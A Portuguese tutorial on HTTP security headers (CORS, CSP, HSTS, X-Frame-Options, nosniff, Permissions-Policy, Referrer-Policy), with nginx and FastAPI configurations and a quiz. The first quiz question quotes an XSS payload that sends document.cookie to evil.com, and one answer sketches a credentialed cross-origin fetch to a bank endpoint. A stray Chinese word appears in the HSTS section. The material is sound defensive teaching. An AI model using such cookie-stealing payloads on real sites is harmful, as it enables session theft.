### Headers de segurança da resposta — CORS, CSP, HSTS, X-Frame-Options e X-Content-Type-Options

Os headers de segurança são instruções que o servidor envia ao browser para fortalecer a postura de segurança da aplicação. Cada um mitiga uma classe específica de ataque: CORS controla acesso cross-origin, CSP previne XSS, HSTS força HTTPS, X-Frame-Options evita clickjacking. Configurá-los corretamente é uma das medidas de segurança mais simples e de maior impacto disponíveis.

---

## CORS — Cross-Origin Resource Sharing

CORS define quais origens externas podem acessar os recursos do servidor via JavaScript. Os headers CORS na **resposta** são o servidor declarando sua política de acesso.

> O mecanismo completo de CORS (incluindo o preflight OPTIONS) foi detalhado em [[1. REDES E INFRAESTRUTURA/Conceitos Fundamentais/Internet/2. Roteamento e Protocolos/2.2 Protocolos de Aplicação/2.2.1. HTTP/2. Estrutura da Requisição/2.2 Métodos HTTP/2.2.1. Verbos e semântica/2.2.1.2. HEAD, OPTIONS, CONNECT e TRACE — métodos auxiliares, CORS preflight e casos de uso|2.2.1.2 — OPTIONS e CORS preflight]]. Este arquivo foca nos headers de resposta.

### Headers CORS na resposta

```
Access-Control-Allow-Origin: https://app.meusite.com
  → Qual origem pode acessar este recurso
  → Valores:
    *                           → qualquer origem (sem credenciais)
    https://app.meusite.com     → apenas essa origem específica
    null                        → nunca usar — inseguro

Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
  → Quais métodos HTTP são permitidos cross-origin

Access-Control-Allow-Headers: Authorization, Content-Type, X-Request-ID
  → Quais headers de requisição são permitidos cross-origin

Access-Control-Allow-Credentials: true
  → Permite enviar cookies e Authorization header cross-origin
  → Requer Allow-Origin específico (não pode ser *)
  → Sem isso: fetch com credentials: 'include' é bloqueado

Access-Control-Max-Age: 86400
  → Cache do preflight OPTIONS por 86400 segundos (1 dia)
  → Sem isso: browser faz preflight a cada requisição (custo extra)

Access-Control-Expose-Headers: X-Total-Count, X-Rate-Limit-Remaining
  → Headers de resposta que o JavaScript pode ler
  → Por padrão: apenas Cache-Control, Content-Language, Content-Type,
                 Expires, Last-Modified, Pragma são acessíveis
  → Headers customizados precisam estar aqui para serem lidos pelo JS
```

### Configuração dinâmica de CORS (origem específica)

```python
# FastAPI — CORS dinâmico
from fastapi import Request
from fastapi.middleware.cors import CORSMiddleware

ALLOWED_ORIGINS = {
    "https://app.empresa.com",
    "https://admin.empresa.com",
    "http://localhost:3000"   # desenvolvimento
}

app.add_middleware(
    CORSMiddleware,
    allow_origins=list(ALLOWED_ORIGINS),
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
    allow_headers=["Authorization", "Content-Type", "X-Request-ID"],
    expose_headers=["X-Total-Count", "X-Rate-Limit-Remaining"],
    max_age=86400
)
```

```nginx
# Nginx — CORS dinâmico com whitelist
map $http_origin $cors_origin {
    default "";
    "https://app.empresa.com"   $http_origin;
    "https://admin.empresa.com" $http_origin;
    "http://localhost:3000"     $http_origin;
}

server {
    location /api/ {
        add_header Access-Control-Allow-Origin $cors_origin always;
        add_header Access-Control-Allow-Credentials true always;
        add_header Access-Control-Allow-Methods "GET, POST, PUT, DELETE, OPTIONS" always;
        add_header Access-Control-Allow-Headers "Authorization, Content-Type" always;
        add_header Access-Control-Max-Age 86400 always;
        add_header Vary "Origin" always;  # importante para cache
        
        if ($request_method = OPTIONS) {
            return 204;
        }
    }
}
```

### Vary: Origin — essencial com CORS dinâmico

```
Quando CORS retorna a origem específica (não *):
  Access-Control-Allow-Origin: https://app.empresa.com

O CDN pode cachear com a origem A e servir para a origem B:
  → Origem B recebe Access-Control-Allow-Origin de origem A
  → Browser bloqueia: "Allow-Origin não corresponde à minha origem"

Solução:
  Vary: Origin
  → CDN armazena versão separada para cada origem
  → Cada origem recebe o header correto
```

## Content-Security-Policy (CSP)

CSP é um mecanismo poderoso de defesa contra XSS (Cross-Site Scripting). Através de uma política declarativa, o servidor instrui o browser sobre quais fontes de conteúdo são confiáveis — scripts, estilos, imagens, etc. Scripts de origens não listadas são bloqueados antes de executar.

```
Content-Security-Policy: <directive> <sources>; <directive> <sources>;
```

### Diretivas CSP principais

```
default-src 'self'
  → Fallback para todas as outras diretivas não especificadas
  → 'self' = apenas da mesma origem

script-src 'self' https://cdn.exemplo.com
  → De onde scripts (<script> e inline eval) podem vir

style-src 'self' 'unsafe-inline' https://fonts.googleapis.com
  → De onde estilos CSS podem vir

img-src 'self' data: https:
  → De onde imagens podem vir
  → data: permite imagens base64; https: permite qualquer HTTPS

font-src 'self' https://fonts.gstatic.com
  → De onde fontes web podem vir

connect-src 'self' https://api.empresa.com wss://ws.empresa.com
  → Para onde JS pode fazer fetch/XHR/WebSocket

frame-src 'none'
  → Nenhuma origem pode ser carregada em <iframe> desta página
  
form-action 'self'
  → Para onde formulários podem ser submetidos

base-uri 'self'
  → Restringe o que pode ser usado no <base> tag

object-src 'none'
  → Nenhum plugin (Flash, etc.) — boa prática sempre
```

### Sources (fontes permitidas)

```
'self'            → mesmo origin (scheme + host + port)
'none'            → nada permitido (bloqueia completamente)
'unsafe-inline'   → scripts/styles inline (EVITAR — anula proteção XSS)
'unsafe-eval'     → eval(), setTimeout(string) (EVITAR)
'nonce-<base64>'  → inline script/style com nonce específico
'sha256-<hash>'   → inline script/style com hash específico
https:            → qualquer HTTPS
http:             → qualquer HTTP (evitar em produção)
*.empresa.com     → qualquer subdomínio de empresa.com
https://cdn.ex.com → origem específica
data:             → data: URIs (imagens base64)
```

### Nonce — permitir scripts específicos sem unsafe-inline

```
Servidor gera um nonce aleatório por requisição:
  nonce = base64(random_bytes(16))
  
Resposta:
  Content-Security-Policy: script-src 'nonce-abc123xyz'

HTML:
  <script nonce="abc123xyz">
    // Este script específico é permitido (o nonce bate)
    init();
  </script>
  
  <script>
    // Este script NÃO tem nonce → bloqueado pelo browser!
    evilScript();
  </script>

Por que é seguro:
  Atacante que injeta HTML <script>malware()</script> não tem o nonce
  Browser bloqueia scripts sem nonce ou com nonce errado
```

```python
# FastAPI — CSP com nonce por request
import secrets
import base64
from fastapi import Request
from fastapi.responses import HTMLResponse

@app.get("/")
async def pagina(request: Request):
    nonce = base64.b64encode(secrets.token_bytes(16)).decode()
    
    # Guardar nonce no contexto para usar no template
    csp = (
        f"default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}'; "
        f"style-src 'self' 'unsafe-inline'; "
        f"img-src 'self' data: https:; "
        f"object-src 'none'; "
        f"base-uri 'self'; "
        f"form-action 'self'"
    )
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head><title>Página</title></head>
    <body>
      <script nonce="{nonce}">
        // Script legítimo com nonce
        console.log('Inicializando...');
      </script>
    </body>
    </html>
    """
    
    return HTMLResponse(content=html, headers={"Content-Security-Policy": csp})
```

### CSP Report-Only — testar sem quebrar

```
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-reports

→ Violações são REPORTADAS mas não bloqueadas
→ Ideal para testar a política antes de enforçar
→ Logs de violações chegam em /csp-reports como POST JSON

{
  "csp-report": {

    "blocked-uri": "https://cdn-externo.com/script.js",
    "source-file": "https://app.exemplo.com/pagina",
    "line-number": 45
  }
}
```

## HSTS — HTTP Strict Transport Security

`HSTS` instrui o browser a **sempre** usar HTTPS para o domínio, nunca HTTP — mesmo que o usuário digite `http://` ou clique em um link HTTP. Após receber o header, o browser faz o upgrade automaticamente antes de fazer qualquer requisição.

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

max-age=31536000
  → Browser usa HTTPS por 31.536.000 segundos (1 ano)
  → Durante esse período: qualquer acesso HTTP é automaticamente升级 para HTTPS
  → A cada visita HTTPS: o timer é renovado

includeSubDomains
  → Aplica a todos os subdomínios (*.empresa.com)
  → Atenção: certifique-se que TODOS os subdomínios têm HTTPS!
  → Um subdomínio sem HTTPS fica inacessível

preload
  → Indica que o domínio pode ser adicionado à HSTS Preload List
  → Lista hardcoded no browser: https://hstspreload.org
  → Sem nunca ter visitado o site, o browser já usa HTTPS
  → Requer: max-age >= 31536000, includeSubDomains, preload
```

### Como HSTS previne ataques

```
Sem HSTS — ataque SSLstrip:
  1. Usuário tenta: http://banco.com
  2. Atacante na rede intercepta o HTTP
  3. Atacante serve versão HTTP falsa do banco (sem HTTPS)
  4. Usuário digita senha → atacante captura

Com HSTS:
  1. Usuário tenta: http://banco.com
  2. Browser verifica: "banco.com está na minha lista HSTS"
  3. Browser faz upgrade para https://banco.com ANTES de enviar qualquer requisição
  4. Atacante não tem certificado válido → browser bloqueia → ataque falha
```

### Implementação progressiva de HSTS

```nginx
# Nginx — implementação gradual

# Fase 1: max-age curto para testar (1 hora)
add_header Strict-Transport-Security "max-age=3600";

# Fase 2: confirmar que tudo funciona, aumentar (1 semana)
add_header Strict-Transport-Security "max-age=604800";

# Fase 3: produção completa (1 ano) sem preload ainda
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains";

# Fase 4: solicitar inclusão na preload list (permanente!)
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload";
```

**ATENÇÃO:** HSTS com `max-age` longo é difícil de desfazer. Se perder o certificado HTTPS, o site fica inacessível por até 1 ano para usuários que já receberam o header. Comece com `max-age` curto.

## X-Frame-Options — prevenção de Clickjacking

Clickjacking: atacante embebe sua página num `<iframe>` invisível sobre outro site. Usuário pensa que está clicando no site legítimo, mas na verdade clica na sua página.

```
X-Frame-Options: DENY
  → A página nunca pode ser embutida em iframe (em qualquer origem)

X-Frame-Options: SAMEORIGIN
  → A página pode ser embutida apenas por páginas da mesma origem
  → Útil para: páginas admin que precisam de iframe próprio

X-Frame-Options: ALLOW-FROM https://parceiro.com
  → Apenas essa origem pode embutir (legado — suporte limitado)
  → Use CSP frame-ancestors para esta funcionalidade
```

### X-Frame-Options vs CSP frame-ancestors

```
X-Frame-Options:
  → Header legado (mas ainda necessário para IE)
  → Suporta apenas DENY e SAMEORIGIN (e ALLOW-FROM parcialmente)
  → Simples de configurar

CSP frame-ancestors:
  → Mais moderno e flexível
  → Múltiplas origens permitidas
  → Sobrescreve X-Frame-Options em browsers modernos
  
  Content-Security-Policy: frame-ancestors 'none'
  Content-Security-Policy: frame-ancestors 'self'
  Content-Security-Policy: frame-ancestors https://parceiro.com https://outro.com

Recomendação: usar AMBOS para compatibilidade máxima
  X-Frame-Options: DENY
  Content-Security-Policy: frame-ancestors 'none'
```

## X-Content-Type-Options

```
X-Content-Type-Options: nosniff

→ Instrui o browser a NÃO fazer MIME sniffing
→ O browser deve usar o Content-Type declarado, sem tentar adivinhar
→ Previne ataques onde um arquivo malicioso é servido com Content-Type errado
   mas o browser "sniffa" e executa como HTML/JS

Exemplo do ataque sem nosniff:
  Servidor retorna:
    Content-Type: text/plain
    Body: <script>malware()</script>
  
  Browser sem nosniff: "parece HTML! Vou renderizar como HTML"
  → Script executa → XSS

  Browser com nosniff: "Content-Type diz text/plain, não vou questionar"
  → Exibe como texto literal → sem XSS

Deve estar em TODAS as respostas de APIs e arquivos servidos.
```

## Permissions-Policy (antigo Feature-Policy)

Controla quais APIs do browser (câmera, microfone, geolocalização) a página pode usar:

```
Permissions-Policy: camera=(), microphone=(), geolocation=()
  → Desabilita completamente câmera, microfone e geolocalização para esta página
  → Mesmo que o JavaScript tente acessar, browser nega
  → () = nenhuma origem permitida

Permissions-Policy: camera=(self), fullscreen=*
  → Câmera: apenas a própria página
  → Fullscreen: qualquer origem

Útil para:
  → Páginas que nunca precisam de câmera/microfone: desabilitar preventivamente
  → Evitar que scripts maliciosos ativem hardware sensível
```

## Referrer-Policy

Controla quanto da URL é enviado no header `Referer` quando o usuário navega para outros sites:

```
Referrer-Policy: no-referrer
  → Nunca envia Referer para nenhum site

Referrer-Policy: no-referrer-when-downgrade
  → Envia Referer em HTTPS→HTTPS, não em HTTPS→HTTP

Referrer-Policy: origin
  → Envia apenas a origem (sem path/query): https://meusite.com

Referrer-Policy: strict-origin-when-cross-origin (recomendado)
  → Same-origin: URL completa
  → Cross-origin HTTPS→HTTPS: apenas origem
  → HTTPS→HTTP: nada
  → Bom equilíbrio entre analytics e privacidade
```

## Security Headers completo — configuração de produção

```nginx
# Nginx — headers de segurança para uma aplicação web moderna

# HTTPS redirect
server {
    listen 80;
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl;
    
    # HSTS
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    
    # Clickjacking
    add_header X-Frame-Options "DENY" always;
    
    # MIME sniffing
    add_header X-Content-Type-Options "nosniff" always;
    
    # CSP básico (adaptar para sua aplicação)
    add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; object-src 'none'; base-uri 'self'; form-action 'self'" always;
    
    # Referrer
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    
    # Permissions
    add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
}
```

```python
# FastAPI — middleware de security headers
from fastapi import Request

@app.middleware("http")
async def security_headers(request: Request, call_next):
    response = await call_next(request)
    
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=()"
    
    # HSTS apenas em HTTPS
    if request.url.scheme == "https":
        response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    
    return response
```

## Erros comuns e armadilhas

**CSP com `unsafe-inline` anula a proteção XSS:** se você adiciona `script-src 'unsafe-inline'`, qualquer script inline pode executar — incluindo os injetados por XSS. Use nonces ou hashes para scripts inline legítimos.

**HSTS sem testar todos os subdomínios:** `includeSubDomains` com um subdomínio sem HTTPS torna aquele subdomínio inacessível pelo período do `max-age`. Sempre verificar que TODOS os subdomínios têm HTTPS válido antes de incluir `includeSubDomains`.

**Access-Control-Allow-Origin: * com credentials:** impossível e bloqueado pelo browser. Credenciais (cookies, Authorization) cross-origin exigem Allow-Origin específico.

**Não incluir `always` no nginx:** sem `always`, headers de segurança são omitidos em respostas de erro (4xx, 5xx). Atacantes podem explorar páginas de erro sem proteção CSP. Sempre usar `add_header ... always`.

## 🧩 Quiz de Fixação

1. Uma aplicação usa `Content-Security-Policy: script-src 'self' 'unsafe-inline'`. Um atacante consegue injetar HTML via um campo de formulário. O ataque `<img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)">` funciona? Por quê, e como corrigir o CSP?

2. Um site configura `Strict-Transport-Security: max-age=31536000; includeSubDomains`. Três meses depois, o certificado SSL do subdomínio `staging.empresa.com` expira e não é renovado. O que acontece com usuários que visitaram o site principal nos últimos 12 meses?

3. Por que `Access-Control-Allow-Origin: *` combinado com `Access-Control-Allow-Credentials: true` é inválido segundo a spec CORS, e qual é o ataque que essa combinação permitiria se fosse aceita pelos browsers?

**Respostas:**

1) O ataque **funciona** apesar do CSP. O atributo `onerror` em uma tag `<img>` é um **event handler inline** — que é coberto por `unsafe-inline` no contexto de `script-src`. Com `unsafe-inline`, qualquer JavaScript inline (em atributos como `onerror`, `onclick`, `onload`) pode executar. O CSP com `unsafe-inline` é essencialmente inútil contra XSS. **Como corrigir:** (a) remover `unsafe-inline`; (b) usar `nonce-<base64>` para scripts legítimos; (c) desativar inline event handlers via CSP — `script-src 'self' 'nonce-abc123'` bloqueia o `onerror` porque não tem nonce. A abordagem mais segura: mover todos os event handlers para arquivos JavaScript externos com `addEventListener()`, eliminando a necessidade de `unsafe-inline`.

2) Os usuários que visitaram o site principal nos últimos 12 meses têm o HSTS gravado no browser com `includeSubDomains`. Quando tentam acessar `staging.empresa.com`, o browser **aplica HSTS**: tenta forçar HTTPS. O certificado expirado faz o browser mostrar um erro de segurança grave (`ERR_CERT_DATE_INVALID`) com o botão "Avançar" frequentemente desabilitado (já que o HSTS indica que o site DEVE ter HTTPS válido). **Os usuários não conseguem acessar** `staging.empresa.com` normalmente — e não há como contornar via browser até que: (a) o certificado seja renovado; (b) OU o max-age de 31536000 segundos expire (1 ano a partir da última visita ao site principal). Para remover o HSTS manualmente: `chrome://net-internals/#hsts` (Chrome).

3) **Por que é inválido:** se `*` fosse aceito com `credentials: true`, qualquer site na internet poderia fazer requisições autenticadas em nome do usuário. O atacante cria `site-malicioso.com` com código JavaScript que faz `fetch('https://banco.com/api/transferir', {credentials: 'include', method: 'POST', body: '...'})`. O browser incluiria automaticamente os cookies de sessão do usuário no banco, e o `*` permitiria qualquer origem. **O ataque:** isso seria equivalente a um ataque CSRF avançado onde o atacante pode ler a resposta (não apenas executar a ação). Com CORS + `*`, o atacante não só executa a transferência, mas também lê a resposta (saldo, confirmação) — tornando possível reconhecimento completo dos dados do usuário. A spec CORS foi projetada especificamente para bloquear isso: `credentials: true` com `*` sempre resulta em erro no browser, forçando o servidor a declarar origens específicas e confiáveis.
